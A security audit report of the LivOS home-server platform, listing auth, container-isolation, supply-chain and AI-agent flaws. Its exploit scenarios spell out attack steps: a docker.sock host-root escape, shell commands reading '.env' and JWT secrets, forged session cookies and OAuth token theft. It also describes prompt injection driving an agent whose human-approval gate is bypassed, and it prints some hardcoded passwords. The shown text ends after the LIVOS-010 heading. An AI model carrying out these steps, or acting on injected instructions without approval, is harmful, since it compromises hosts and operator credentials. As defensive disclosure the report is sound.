# LivOS Security Audit

**Date:** 2026-06-03
**Scope:** Static review of the `livinity-io` repository (livinityd, liv core/memory, platform tier, install/update scripts) **plus** live inspection of the production Mini PC (`bruce@10.69.31.68` / `192.168.20.33`).
**Methodology:** 10 parallel finding agents across distinct attack-surface dimensions (auth/JWT/RBAC, AI-agent tool execution & prompt injection, container isolation, install/update supply chain, Caddy/gateway/SSRF, secrets management, tRPC input validation, plus live network/file-permission/secrets-at-rest checks). Every finding was then re-examined by an adversarial verifier that attempted to refute the claim against the actual code; only verifier-survived findings are included here, each with the verifier's note and a calibrated severity.

> **Note on live findings:** Some findings are live observations from `docker inspect` / `ss` / `stat` on the Mini PC. They were not re-run during write-up (sudo-gated, and the box is the operator's only production deployment), but each was cross-checked against the repository code that provisions the observed state. **No live exploitation was performed** — exploit chains are demonstrated by code/configuration analysis only.

---

## Executive Summary

LivOS is in a fundamentally sound architectural place — it uses bcrypt password hashing, AES-256-GCM at-rest encryption with proper IV/tag handling, HS256 JWTs that block algorithm-confusion, and constant-time API-key comparison. But the audit surfaced a cluster of **Critical and High** issues that share three dangerous themes, and any one of them is sufficient to fully compromise the operator's host or cloud-AI accounts.

**Theme 1 — Untrusted code runs with host-root or operator-credential power.** The marketplace/app pipeline trusts third-party `docker-compose` files verbatim: there is no filtering of `privileged: true`, `network_mode: host`, or `/var/run/docker.sock` mounts, and the install route is reachable by *any authenticated user*, not just admins. The live Mini PC proves this is not theoretical — the OpenHands container already mounts the host Docker socket read-write (a one-step host-root escape), and OpenDesign mounts the operator's real Claude/Gemini OAuth credential directories read-write. The `requiresLocalAiClis` feature bind-mounts those same credentials into arbitrary catalog apps with a consent gate that *does not exist in the codebase*. Separately, the AI agent's `shell` and `files` tools execute on the host with **no human-approval gate at all** — the entire ApprovalManager subsystem is dead code in the production SDK runner.

**Theme 2 — Authentication and isolation fail open / fail to the wrong default.** A deactivated or deleted user's still-valid JWT is silently promoted to *admin-equivalent* because "no resolved user" is treated as legacy single-user mode. Password changes and account deactivation never revoke outstanding tokens (the `sessions` table exists but is never used). The app-subdomain login gate authenticates on mere *presence* of a `LIVINITY_SESSION` cookie — any value unlocks the app. The session cookie is widened to `.livinity.io`, leaking it to the shared platform host and sibling tenants. The core/memory API key middleware fails open when the env var is unset, and the canonical installer does not always seed that key.

**Theme 3 — Supply-chain trust without verification.** `update.sh` (run as root) clones and executes whatever HEAD GitHub serves with no commit pinning or signature check, silently falls back to `--no-frozen-lockfile`, and `curl | sudo bash` is the documented install path with no checksum. The skill marketplace `import()`s arbitrary downloaded `index.js` in-process with cosmetic "permissions."

**What to fix first (in order):**
1. **Strip `privileged` / `docker.sock` / host-path mounts from all non-builtin app compose, and restrict `requiresLocalAiClis` + `addRepository` + `install`-of-new-apps to verified/admin-only.** This closes the host-root escape that is *live today* on the Mini PC (OpenHands) and the credential-theft surface (OpenDesign, `requiresLocalAiClis`).
2. **Make the agent's `shell`/`files`/`docker_*` tools require human approval and sandbox `files` to per-user paths** — the documented safety control currently does nothing.
3. **Make auth fail closed:** throw on inactive/deleted users, never treat "no currentUser" as admin, wire token revocation, and validate the JWT (not cookie presence) at the subdomain gate.

---

## Findings by Severity

| Severity | Count |
|----------|-------|
| Critical | 3 |
| High | 12 |
| Medium | 9 |
| Low | 10 |
| Info | 1 |
| **Total** | **35** |

| ID | Severity | Title | Location |
|----|----------|-------|----------|
| LIVOS-001 | Critical | Operator Claude/Gemini OAuth creds bind-mounted RW into third-party app containers; no consent gate | inject-local-ai-clis.ts; apps.ts; schema.ts |
| LIVOS-002 | Critical | Human-in-the-loop approval is dead code — agent shell/file/Docker tools auto-execute | sdk-agent-runner.ts; agent.ts; tool-registry.ts |
| LIVOS-003 | Critical | OpenHands container mounts host `/var/run/docker.sock` RW (full host-root escape) | Live: Mini PC `/openhands` container |
| LIVOS-004 | High | adminProcedure RBAC bypass: deactivated/deleted user w/ valid JWT treated as legacy admin | is-authenticated.ts; trpc.ts |
| LIVOS-005 | High | Password change / deactivation do not revoke existing JWT sessions | user/routes.ts; is-authenticated.ts; jwt.ts |
| LIVOS-006 | High | Legacy token + shared proxy token grant admin-scoped file tree (cross-user isolation fallback) | server/index.ts; files/files.ts; jwt.ts |
| LIVOS-007 | High | No host-path validation on per-user app compose volumes (arbitrary host mounts) | apps.ts (installForUser); routes.ts |
| LIVOS-008 | High | Login gate is cookie-PRESENCE-only — any `LIVINITY_SESSION=<garbage>` unlocks gated subdomains | caddy.ts |
| LIVOS-009 | High | `files` agent tool has no path sandbox — arbitrary host read/write/delete | daemon.ts |
| LIVOS-010 | High | luse `computer_read_file` sandbox exposes entire `/home/<slug>/` (OAuth creds) | computer-use/mcp/tools.ts |
| LIVOS-011 | High | update.sh pulls/builds/restarts from GitHub with no commit pin / signature (compromised-repo RCE) | update.sh |
| LIVOS-012 | High | Skill marketplace `import()`s arbitrary repo `index.js` in-process; permissions cosmetic | skill-registry-client.ts; skill-loader.ts; api.ts |
| LIVOS-013 | High | Untrusted app-store compose run verbatim — no filter of privileged/docker.sock/host-mount | apps.ts; app-repository.ts; app-store.ts |
| LIVOS-014 | High | liv-core API auth fails open when LIV_API_KEY unset; install never seeds it | auth.ts; env-seed.sh; deploy-livinityd.sh |
| LIVOS-015 | High | livinityd admin daemon (8080) exposed to entire LAN / UFW-open from Anywhere | Live: Mini PC; cli.ts; UFW |
| LIVOS-016 | High | openhands container mounts `/var/run/docker.sock` — container-escape primitive | Live: Mini PC `openhands` |
| LIVOS-017 | High | OpenDesign container mounts operator host AI creds (~/.claude, ~/.gemini) RW | Live: Mini PC `/open-design` |
| LIVOS-018 | Medium | LIV_API_KEY graceful-degradation disables all API auth on liv core when unset | core/auth.ts; api.ts |
| LIVOS-019 | Medium | liv/core API fail-open (agent execution loop, port 3200) when LIV_API_KEY unset | core/auth.ts |
| LIVOS-020 | Medium | Hardcoded Redis password `LivRedis2024!` in heartbeat-runner | core/heartbeat-runner.ts |
| LIVOS-021 | Medium | Hardcoded platform DB password `LivPlatform2024` in committed Next.js fallbacks | platform/web/src/lib/db.ts; drizzle.config.ts |
| LIVOS-022 | Medium | Builtin Portainer app ships docker.sock mount + privileged host-network DinD | builtin-apps.ts |
| LIVOS-023 | Medium | Session cookie widened to `.livinity.io` — leaks session to shared host & sibling tenants | user/routes.ts |
| LIVOS-024 | Medium | SSRF + arbitrary git-fetch in apps.addRepository (no scheme/host allowlist, non-admin) | routes.ts; app-store.ts; app-repository.ts |
| LIVOS-025 | Medium | API key middleware fails open when LIV_API_KEY unset (graceful degradation) | core/auth.ts |
| LIVOS-026 | Medium | `curl \| bash` one-line installer documented with no integrity/signature check | README.md; install.sh |
| LIVOS-027 | Low | openclawos approvals/handshake routes authenticate any logged-in user without role check | openclawos/approvals-routes.ts |
| LIVOS-028 | Low | JWT lacks audience/issuer binding; proxy & session tokens share one secret | jwt.ts |
| LIVOS-029 | Low | Memory service fails open with no API key — unauthenticated read/write of agent memory | memory/src/auth.ts |
| LIVOS-030 | Low | Hardcoded fallback PostgreSQL password `LivPostgres2024!` in livinityd db module | database/index.ts; docker-compose.postgres.yml |
| LIVOS-031 | Low | Weak default DB credential `liv:liv` written by legacy livos/setup.sh | livos/setup.sh |
| LIVOS-032 | Low | Legacy Server4 script hardcodes Redis password `NexusRedis2024!` | liv/deploy/setup-server4.sh |
| LIVOS-033 | Low | At-rest credential encryption key derived from JWT signing secret (key reuse) | docker/registry-credentials.ts (+ siblings) |
| LIVOS-034 | Low | World-writable (0o777) scratch HOME hosts nested operator-credential mount | inject-local-ai-clis.ts |
| LIVOS-035 | Low | upstreamBearer token interpolated UNESCAPED into Caddyfile (config-injection) | caddy.ts; apps.ts |
| LIVOS-036 | Low | Custom-domain gateway unauthenticated + substring container-name match (port confusion) | server/index.ts |
| LIVOS-037 | Low | Host/Origin→loopback rewrite defeats daemon DNS-rebinding/CSRF guard | caddy.ts |
| LIVOS-038 | Low | MCP streamableHttp SSRF guard checks only literal hostname (DNS-rebind/IPv6 bypass) | mcp-client-manager.ts |
| LIVOS-039 | Low | `share-password` secret file is mode 644 (defense-in-depth gap) | Live: Mini PC; samba.ts |
| LIVOS-040 | Info | update.sh auto-installs broad apt set every run with no version pinning | update.sh |

> Index IDs 018/019/025 are three independent finder hits on the same liv-core fail-open class, retained separately as verified; 016/017 are live confirmations of the host-socket / credential-mount class also described in code findings 001/003/013.

---

## Detailed Findings

### LIVOS-001 — Operator Claude/Gemini OAuth credentials bind-mounted RW into third-party app containers; no UI consent gate exists
- **Severity:** Critical — CVSS 9.1 (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N`)
- **Location:** `livos/packages/livinityd/source/modules/apps/inject-local-ai-clis.ts:219-220, 299-332`; `apps.ts:578-596,635-642`; `schema.ts:68-78`
- **Description:** When an app manifest declares `requiresLocalAiClis: true`, the installer bind-mounts the operator's real host credential dirs (`~/.claude`, `~/.gemini` — holding the OAuth access/refresh tokens for the operator's paid subscriptions) **read-write** into a third-party marketplace container, then grants the container uid recursive ACL access. Any code in that container can read `~/.claude/.credentials.json` / `~/.gemini/oauth_creds.json` and exfiltrate the tokens, or run unlimited inference on the operator's subscription. The flag is a plain optional boolean settable by ANY catalog app; the schema comment claims a UI consent gate, but `requiresLocalAiClis` appears in only 4 backend files and zero UI code — **the gate does not exist.** Root-running containers skip even the ACL step ("uid 0 reads everything").
- **Exploit Scenario:** Attacker publishes/compromises a marketplace app with `requiresLocalAiClis: true`. Operator installs it. `apps.ts:589` mounts `/home/bruce/.claude:/opt/livos-clis/home/.claude:rw` (+`.gemini`); `apps.ts:638` grants rwX. The app's entrypoint `cat`s `.credentials.json` and POSTs the tokens out. RW mount also allows overwriting the tokens.
- **Evidence:**
```ts
// inject-local-ai-clis.ts:219-220
if (detected.creds.claudeDir) add(`${detected.creds.claudeDir}:${CLI_MOUNT_PREFIX}/home/.claude:rw`)
if (detected.creds.geminiDir) add(`${detected.creds.geminiDir}:${CLI_MOUNT_PREFIX}/home/.gemini:rw`)
// :316-318 (root containers bypass even the ACL step)
if (!uid || uid === '0') { logger?.log(`...uid ${uid||'?'} (root or unknown) — no ACL needed`); return }
// schema.ts:76 claims a gate that does not exist:
// 'Optional; defaults to false. Gated by install-time consent at the UI layer.'
```
- **Recommendation:** Do not bind-mount long-lived OAuth credentials into untrusted containers. Proxy CLI calls through a host-side broker that never exposes the token files (the existing `requiresAiProvider` broker already does this). At minimum: (a) implement a real, explicit install-time consent prompt; (b) restrict `requiresLocalAiClis` to a curated allowlist keyed on the catalog `verified` flag, not a self-asserted manifest bool; (c) mount creds read-only with short-lived scoped tokens.
- **Verifier Note:** Verified every cited element. `detectHostAiClis()` resolves `~/.claude`/`~/.gemini` via `os.homedir()`; mounts are `:rw`; `grantContainerCredsAcl` runs `setfacl -R -m u:<uid>:rwX` and early-returns for uid 0. The single-user `install()` reads the manifest from the marketplace catalog and acts on the flag with no consent check. Repo-wide grep for `requiresLocalAiClis` returns only backend/docs files, zero UI hits — the consent gate is absent. Kept Critical: full read+write theft of the operator's primary cloud-AI account credentials by arbitrary container code. Only mitigating nuance (insufficient to downgrade): requires the operator to install a malicious/compromised marketplace app (supply-chain/social-engineering), and the system is single-operator (no cross-tenant blast radius).

---

### LIVOS-002 — Human-in-the-loop approval system is dead code in production — agent shell/file/Docker tools auto-execute with no confirmation
- **Severity:** Critical — CVSS 8.8 (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H`)
- **Location:** `liv/packages/core/src/sdk-agent-runner.ts:91-92,216,384`; `agent.ts:344,352`; `tool-registry.ts:144-148`
- **Description:** The production agent runner is the SDK runner (default `liv:config:agent_runner='sdk'`). It builds `allowedTools = sdkTools.map(t => 'mcp__nexus-tools__'+t.name)` covering every Nexus tool (shell, files, docker_manage, docker_exec, pm2) plus `mcp__chrome-devtools__*` and `mcp__<additional>__*` wildcards, then runs `query()` with `permissionMode:'dontAsk'`. The tool wrapper explicitly comments `// SDK mode: skip Nexus approval gate`. The legacy `agent.ts` path that *does* call `checkApproval` defaults to policy `'destructive'`, which only gates tools where `requiresApproval===true` — but **no tool anywhere sets `requiresApproval:true`**. So in BOTH runners every tool, including arbitrary shell exec, runs with zero human approval; the entire ApprovalManager/audit subsystem is unreachable.
- **Exploit Scenario:** A caller of `POST /api/agent/stream` (or prompt injection into the model) submits a task. The SDK runner spawns Claude Code with all Nexus tools wildcard-allowlisted and `permissionMode 'dontAsk'`. The model emits `shell` `{cmd:'cat /opt/livos/.env; cat /opt/livos/data/secrets/jwt'}` which executes immediately. No `approval_request` event is ever generated.
- **Evidence:**
```ts
sdk-agent-runner.ts:216  const allowedTools = sdkTools.map((t: any) => `mcp__nexus-tools__${t.name}`);
sdk-agent-runner.ts:384  permissionMode: 'dontAsk',
sdk-agent-runner.ts:91   // SDK mode: skip Nexus approval gate
agent.ts:352  const needsApproval = policy === 'always' || toolRegistry.requiresApproval(toolName);
// grep 'requiresApproval\s*:\s*true' over liv/packages/core/src → No matches found
```
- **Recommendation:** Mark destructive tools (shell, files write/delete, docker_*, pm2, device_*_shell) `requiresApproval:true` AND enforce it in the SDK path via the SDK `canUseTool`/permission callback routing through ApprovalManager, instead of `permissionMode:'dontAsk'` with everything in `allowedTools`.
- **Verifier Note:** Verified every location. Production default runner is SDK. `allowedTools` covers every registered Nexus tool plus chrome-devtools/additional wildcards. `permissionMode:'dontAsk'`. The wrapper bypasses ApprovalManager entirely. Legacy path defaults `'destructive'` and only gates on `requiresApproval===true`, which no tool sets (grep empty). `shell` runs `shell.execute(cmd)` on the host directly. In BOTH runners arbitrary host shell exec runs with zero approval; the documented safety control silently does nothing.

---

### LIVOS-003 — OpenHands app container mounts host `/var/run/docker.sock` RW (full host-root escape)
- **Severity:** Critical — CVSS 9.3 (`CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H`)
- **Location:** Live: Mini PC `docker` container `/openhands` (`docker.openhands.dev/openhands/openhands:1.7`) — Mount Source `/var/run/docker.sock` → Destination `/var/run/docker.sock`, Mode `rw`
- **Description:** The OpenHands container (an autonomous AI-coding agent exposed to LivOS users) bind-mounts the host Docker daemon socket read-write; the socket is world-writable (`srw-rw-rw-`). Any code execution inside this container — and running code is OpenHands' *purpose* — can drive the host Docker API to create a privileged container bind-mounting host `/`, gaining root on the Mini PC: read every secret (JWT signing key, `.env` DB/Redis creds, operator SSH keys) and pivot to other users' app data. The Docker socket is the single most powerful host-escape primitive, handed to an agent container by design.
- **Exploit Scenario:** An OpenHands task (operator-driven or injected) runs shell in the container. It POSTs to the mounted `docker.sock` `/containers/create` with `HostConfig.Binds=['/:/host']` + `Privileged=true`, starts it, `chroot /host`, reads `/opt/livos/data/secrets/jwt` and `/opt/livos/.env`. It then forges admin JWTs / dumps Postgres+Redis creds / installs persistence as host root.
- **Evidence:**
```text
docker inspect /openhands Mounts: {"Type":"bind","Source":"/var/run/docker.sock","Destination":"/var/run/docker.sock","Mode":"rw","RW":true}
$ docker exec openhands ls -la /var/run/docker.sock
srw-rw-rw- 1 root 124 0 May 29 09:08 /var/run/docker.sock
```
- **Recommendation:** Do not mount `docker.sock` into app containers. If OpenHands needs orchestration, proxy through a hardened `docker-socket-proxy` exposing a minimal read-only API, or use a rootless/sysbox runtime per app. At minimum mount `:ro` with a least-privilege API allowlist.
- **Verifier Note:** Confirmed. Live observation; code corroborates every load-bearing claim. RW `docker.sock` = textbook host-escape, no CVE needed. OpenHands' normal mode is running code in its own container, so "code execution" is the product's purpose, not a separate precondition. `compose-generator.ts:40,59-60,95-97` copies manifest volumes/privileged/security_opt verbatim with no `docker.sock` filter — a structural LivOS gap. `builtin-apps.ts` already treats host `docker.sock` as a normal capability, so no guard prevents this. No userns-remap/rootless/gVisor in the live daemon. Critical stands: single-step, deterministic full host-root escape from a multi-user-exposed agent container on the only production deployment.

---

### LIVOS-004 — adminProcedure RBAC bypass: deactivated/deleted users with valid JWT are treated as legacy admin
- **Severity:** High — CVSS 8.1 (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L`)
- **Location:** `livos/packages/livinityd/source/modules/server/trpc/is-authenticated.ts:70-91` + `requireRole` `:115-138`; `adminProcedure` wiring `trpc.ts:35`
- **Description:** In `isAuthenticated`, a multi-user token's `userId` is resolved with `findUserById`, but `currentUser` is set ONLY when `dbUser && dbUser.isActive`. For a deactivated/deleted user the guard fails silently, `currentUser` stays unset, and the middleware still calls `next()`. Then `requireRole('admin')` does `if (!ctx.currentUser) return next()` — interpreting "no currentUser" as legacy single-user = full admin. JWTs are stateless: the `sessions` table (with `revoked`/`expires_at`) is never written or consulted, so deactivation/deletion does NOT invalidate an already-issued token. Net: disabling a user fails to revoke access AND silently promotes them to admin-equivalent on every adminProcedure route.
- **Exploit Scenario:** Admin invites a guest who logs in (role `'guest'`). While active the guest is correctly FORBIDDEN on adminProcedure routes. Admin disables the guest (`toggleUserActive(false)`). Guest reuses the SAME valid JWT → `findUserById` returns `is_active=false` → `currentUser` unset → `if (!ctx.currentUser) return next()` → guest now executes `user.updateUserRole` (promote self), `cliInstaller.install`, `agent create/runOnce`, etc. as admin until the 7-day token exp.
- **Evidence:**
```ts
// is-authenticated.ts
if (dbUser && dbUser.isActive) { ctx.currentUser = {...} }   // else currentUser stays unset, NO throw
return next()
// requireRole:
if (!ctx.currentUser) return next()   // treats absent currentUser as legacy admin
// schema.sql: sessions.revoked column present but never queried in the auth path
```
- **Recommendation:** In `isAuthenticated`, when `payload.userId` is present but `findUserById` returns null OR `isActive===false`, THROW `TRPCError UNAUTHORIZED` instead of falling through. Make `requireRole` fail-closed: treat a request as legacy/admin only via an explicit `ctx.legacySingleUser` boot flag, never merely because `currentUser` failed to resolve from a userId-bearing token. Wire the `sessions` table (or per-user `token_version`/iat-floor) so deactivation/deletion/password-change revokes JWTs.
- **Verifier Note:** Verified the full chain. `findUserById` does not filter on `is_active`, returning the inactive row → guard fails → fall-through to `next()` → `requireRole` treats absent currentUser as admin. `adminProcedure = privateProcedure.use(requireRole('admin'))`. JWT verify does pure signature+exp, no sessions lookup. An ACTIVE member/guest does NOT get admin (so not at-will self-escalation); the issue is (a) deactivation fails to revoke and (b) deactivated/deleted user is promoted to admin. Requires a prior admin deactivation + a still-valid JWT, hence High not Critical.

---

### LIVOS-005 — Password change and account deactivation do not revoke existing JWT sessions
- **Severity:** High — CVSS 7.5 (`CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`)
- **Location:** `user/routes.ts:272-304` (changePassword), `:616-635` (toggleUserActive), `:638-655` (deleteUser); `is-authenticated.ts:60-91`; `jwt.ts:52-58`; `schema.sql:16-26` (unused sessions table)
- **Description:** Authentication is purely stateless: `verifyToken` only checks the HS256 signature + exp — no token-version, jti deny-list, or session lookup. `changePassword` updates the bcrypt hash but issues/invalidates no token. Login signs a 1-week JWT in a 30-day cookie. The `sessions` table with `revoked`/`expires_at` exists but is never written or read in the auth path. Consequently an attacker who captured a victim's JWT retains access for up to a week even after a password change, and an admin cannot forcibly log a user out.
- **Exploit Scenario:** Attacker obtains a user's `LIVINITY_SESSION` JWT (leaked via a `.livinity.io` app subdomain, or a shared device). Victim changes their password — succeeds, but the old JWT's signature is still valid and exp unchanged. Attacker keeps using the stolen JWT against all private/admin routes for the remaining token life; no server-side revocation exists.
- **Evidence:**
```ts
jwt.ts: jwt.sign(payload, secret, {expiresIn: ONE_WEEK, algorithm: 'HS256'});
routes.ts:212  cookie maxAge 30*ONE_DAY, domain '.livinity.io'
// changePassword updates hashed_password only — no token rotation/revocation
// sessions.revoked column — never SELECTed; only `DELETE FROM sessions` on user delete
```
- **Recommendation:** Persist a session row (token_hash) on login and check `revoked=false AND expires_at>now()` in `isAuthenticated`; revoke on changePassword/logout/toggleUserActive/deleteUser. Alternatively add a per-user `token_version`/`password_changed_at` claim and reject tokens with `iat` older than it. Reduce cookie maxAge to match token exp.
- **Verifier Note:** All cited code verified. `verify()` does only signature+exp. `changePassword` updates hash only. The `sessions` table is never INSERTed/SELECTed in any auth path (the only reference is `DELETE FROM sessions` on user deletion). Core claim proven: password change does not invalidate JWTs. (For the deactivation sub-claim, `is-authenticated.ts` checks `isActive` but on false falls through unset → treated as admin per LIVOS-004 — worse than described.) High not Critical: requires the attacker to already possess a valid token (XSS, cookie leak to `.livinity.io`, shared device); the widened cookie scope materially raises capture likelihood, justifying High over Medium.

---

### LIVOS-006 — Legacy token + shared user-agnostic proxy token grant admin-scoped file tree (cross-user isolation fallback)
- **Severity:** High — CVSS 7.1 (`CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:L`)
- **Location:** `server/index.ts:1426-1453` (privateApi gate); `files/files.ts:178-184` (getActiveBaseDirectories); `files/api.ts:11-17`; `jwt.ts:93-99` (signProxyToken)
- **Description:** The `/api/files` private router authorizes solely on `LIVINITY_PROXY_TOKEN`, whose payload is `{proxyToken:true}` with NO userId/role and is identical for every user. Per-user file isolation depends on extracting `currentUser` from the session JWT, but that extraction is wrapped in try/catch and documented "Non-fatal: legacy tokens without userId still work." `getActiveBaseDirectories()` returns the GLOBAL/admin base dirs whenever `userInfo` is absent OR `role==='admin'`. So any request bearing a valid proxy token but no userId-bearing session token reads/writes the shared admin file tree (`/Home`, `/Trash`, `/Apps`, `/Backups`) instead of the per-user `users/<username>` subtree.
- **Exploit Scenario:** A member issues `GET /api/files/download?path=/Home/...` (or `/view`, or `POST /upload`) with the proxy cookie present but `LIVINITY_SESSION` OMITTED (trivial via curl/devtools). `currentUser` stays undefined → `getActiveBaseDirectories` returns the global admin dirs → cross-tenant read AND write into the admin home, escaping the user's sandbox.
- **Evidence:**
```ts
// index.ts privateApi: only hard gate
const isValid = await this.verifyProxyToken(token).catch(() => false); if (!isValid) return response.status(401)
// session extraction in try/catch: 'Non-fatal: legacy tokens without userId still work'
// files.ts:178: if (!userInfo || userInfo.role === 'admin') return this.baseDirectories
// jwt.ts signProxyToken payload: {proxyToken: true}  — no user binding
```
- **Recommendation:** Make per-user file resolution fail-closed: if the proxy token is valid but no userId-resolved `currentUser` is present in multi-user mode, reject (401) or default to a non-privileged empty scope rather than the global admin tree. Bind file authorization to the per-user session JWT (require userId), or embed the userId in the proxy token.
- **Verifier Note:** Confirmed by tracing the data flow. The only hard gate is `verifyProxyToken`; the proxy token is user-agnostic and identical for everyone. Session extraction is best-effort in try/catch ("Non-fatal..."). `getActiveBaseDirectories` returns the global tree on absent `userInfo`; download/view/upload all flow through it. Cookies are client-controlled; omitting `LIVINITY_SESSION` while sending the proxy cookie yields cross-tenant read+write. The contrasting tRPC `isAuthenticated` THROWS on missing token, proving the REST proxy-only gate is a genuine omission. High not Critical: requires an authenticated non-admin account, but any member trivially escapes to the admin/shared file tree.

---

### LIVOS-007 — No host-path validation on per-user app compose volumes — malicious marketplace app can mount arbitrary host paths
- **Severity:** High — CVSS 8.2 (`CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H`)
- **Location:** `apps.ts:1685-1701` (installForUser) and `1677-1716`; install route `routes.ts:172-198`
- **Description:** `installForUser` (reachable by NON-admin members/guests via the `install` privateProcedure) templates the marketplace compose verbatim. The only volume processing is a prefix-remap for a handful of known strings (`/data/storage`, `/home`, `/home/Downloads`). Any volume whose host side doesn't match passes through UNCHANGED — no allowlist confining mounts to the user's own app-data dir, no rejection of `/var/run/docker.sock`, `/`, `/opt/livos/data/users/<otheruser>`, `/home/bruce/.claude`, `privileged: true`, or `cap_add`. Then `docker compose up -d` runs it. A crafted app can mount the Docker socket (host root), read another user's app-data, or read operator secrets.
- **Exploit Scenario:** Attacker app ships compose `volumes: ['/var/run/docker.sock:/var/run/docker.sock']` (or `'/:/host:ro'`, or `'/opt/livos/data/users/victim/app-data:/loot'`). A member installs it; the remap loop finds no matching prefix → path intact → `docker compose up -d` → the container drives the Docker daemon to launch a privileged container mounting host `/` = full host compromise, or directly reads the victim's volumes / operator secrets.
- **Evidence:**
```ts
// apps.ts:1685-1701 — the ONLY volume handling
service.volumes = service.volumes.map((v) => {
  if (v.includes('/data/storage/downloads')) { ... }
  if (v.includes('/data/storage')) { ... }
  if (v.includes('/home/Downloads')) { ... }
  if (v.includes('/home') && !v.includes('/users/')) { ... }
  return v   // <-- arbitrary host path mounted unchanged
})
// no docker.sock / privileged / cap_add check anywhere in the install path
```
- **Recommendation:** Validate every compose volume host path against an allowlist confined to `${dataDirectory}/users/<user>/...`; reject binds to `/var/run/docker.sock`, `/proc`, `/sys`, `/`, host home/secret dirs. Reject `privileged`, `cap_add`, `network_mode: host`, `pid: host` for non-verified apps. Run user containers with `no-new-privileges` + dropped caps.
- **Verifier Note:** Confirmed. The only volume processing is the cited prefix-remap; everything else hits `return v`. Grep for docker.sock/privileged/cap_add finds only builtin apps' deliberate uses — no defensive blocklist. `install` is `privateProcedure` (any authenticated role); `addRepository` is ALSO privateProcedure, so a non-admin can register an attacker repo and fully control compose content. The most direct exploit traverses the GLOBAL `install()` path which has the SAME missing validation. High (untrusted-user → host-root) not Critical (no unauth vector).

---

### LIVOS-008 — Login-gate is cookie-PRESENCE-only: any `LIVINITY_SESSION=<garbage>` cookie unlocks every gated app/native subdomain
- **Severity:** High — CVSS 8.1 (`AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`)
- **Location:** `domain/caddy.ts:582-593` (installed apps) and `:612-622` (native apps)
- **Description:** The Caddy `@notauth` gate fronting installed-app subdomains (single-user mode) AND all native-app subdomains decides "logged in" purely by whether a cookie *named* `LIVINITY_SESSION` is present, via a substring glob. It never validates the JWT. In single-user mode the gated block reverse_proxies DIRECTLY to the container port (`127.0.0.1:${sub.port}`), so Caddy is the only checkpoint — the livinityd JWT check (`server/index.ts:428-479`) only runs when Caddy wildcards to `:8080` in MULTI-user mode. Therefore `Cookie: LIVINITY_SESSION=x` is sufficient to load any installed/native app and reach its backend.
- **Exploit Scenario:** Attacker hits `https://open-design-bruce.livinity.io/` → no cookie → 302 `/login`. Re-sends with `Cookie: LIVINITY_SESSION=anything`. Matcher `header Cookie *LIVINITY_SESSION=*` matches, `@notauth` doesn't fire, Caddy proxies straight to the container. For OpenDesign the block ALSO injects `Authorization: Bearer <OD_API_TOKEN>` and rewrites Host/Origin to loopback — so the forged-cookie request is fully authenticated to the daemon and drives the agent (which runs claude/gemini with operator creds) with zero valid session.
- **Evidence:**
```caddy
@notauth { not { header Cookie *LIVINITY_SESSION=* } }
handle @notauth { redir https://${config.mainDomain}/login?... }
reverse_proxy 127.0.0.1:${sub.port} {
  ${sub.upstreamBearer ? `header_up Authorization "Bearer ${sub.upstreamBearer}" ...` : ''}
}  // proxies after presence-only check; no JWT validation
```
- **Recommendation:** Caddy cannot validate a JWT with a glob. Route gated subdomains through livinityd's `:8080` gateway (which verifies the token) even in single-user mode, OR add a `forward_auth` directive to a livinityd `/auth/verify` endpoint that 200s only on a valid JWT. Never treat cookie presence as authentication.
- **Verifier Note:** Confirmed exploitable. `@notauth` uses a Caddy glob substring on the raw Cookie header; presence-only, never validated. Single-user installed-app block and native-app blocks reverse_proxy directly to the container; the validating Express gateway only runs on the multi-user `:8080` wildcard path. Single-user is the default (`multiUser=false`; Redis `livos:system:multi_user !== 'true'`). OpenDesign bearer-injection + Host/Origin rewrite verified, making the forged request daemon-authenticated. High not Critical: requires an internet-exposed installed/native app subdomain (via the Server5 relay), and the escalation requires an OpenDesign-class app present.

---

### LIVOS-009 — `files` agent tool has no path sandbox — arbitrary host read/write/delete
- **Severity:** High — CVSS 8.1 (`CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N`)
- **Location:** `liv/packages/core/src/daemon.ts:1668-1718` (registered tool) and `917-968` (router variant)
- **Description:** The `files` tool performs `fs.readFile/writeFile/readdir/stat/rm(recursive)/unlink/mkdir` on whatever absolute `path` the model supplies, with NO allowlist or traversal guard (contrast luse's `computer_read_file` which enforces `isPathAllowed`). It runs as the livinityd process user (bruce), which owns `/opt/livos/.env`, `/opt/livos/data/secrets/jwt`, and home AI credentials. Because tools auto-approve (LIVOS-002) and are injectable (LIVOS-002), this is a direct secret-exfiltration and config-tampering primitive.
- **Exploit Scenario:** Injected/malicious task triggers `files{operation:'read',path:'/opt/livos/data/secrets/jwt'}` → forge admin JWTs; or `read /opt/livos/.env` → recover DB/LIV_API_KEY; or `files{operation:'delete',path:'/opt/livos/data'}` for destruction — all with no approval and no path restriction.
- **Evidence:**
```ts
daemon.ts:1682  const data = await fs.readFile(path, 'utf-8');
daemon.ts:1688  await fs.writeFile(path, content, 'utf-8');
daemon.ts:1706-1709  if (stat.isDirectory()) { await fs.rm(path,{recursive:true}); } else { await fs.unlink(path); }
// no isPathAllowed/realpath/prefix check anywhere in the handler
```
- **Recommendation:** Apply the luse `isPathAllowed` realpath+allowlist sandbox to the `files` tool, restricting to per-user data/upload dirs; explicitly deny `/opt/livos/.env`, `/opt/livos/data/secrets`, and home credential dirs; require approval for write/delete.
- **Verifier Note:** Confirmed in both handlers; only guard is `if (!path)`. Grep for `isPathAllowed|realpath|allowlist|sandbox` finds no guard in either. The luse contrast is accurate (sandbox exists only in the luse tools file). Approval: only `['shell']` is marked `requiresApproval`, so `files` executes without approval even under the default policy. High not Critical: requires the agent loop to be driven to call `files` with a malicious path (prompt-injection/malicious-task surface), keeping it below a direct unauth network primitive.

---

### LIVOS-010 — luse `computer_read_file` sandbox exposes entire `/home/<slug>/` (host AI provider OAuth credentials)
- **Severity:** High — CVSS 7.1 (`CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:N/A:N`)
